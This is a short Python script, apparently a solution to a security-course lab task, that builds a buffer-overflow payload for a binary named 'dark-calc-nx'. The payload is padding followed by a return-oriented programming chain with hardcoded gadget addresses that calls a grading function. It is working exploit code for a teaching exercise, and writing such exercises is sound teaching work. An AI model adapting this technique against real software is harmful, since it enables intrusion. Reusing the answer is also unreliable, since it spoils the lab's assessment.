#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(value):
    return struct.pack("<Q", value)

POP_RDI_RET = 0x401A33
RET = 0x401A34
GRADE_EVAL = 0x401978

padding = b"1\x00" + b"A" * 22

rop_chain = (
    p64(POP_RDI_RET)
    + p64(4)
    + p64(RET)
    + p64(GRADE_EVAL)
)

payload = padding + rop_chain

sys.stdout.buffer.write(payload + b"\n")
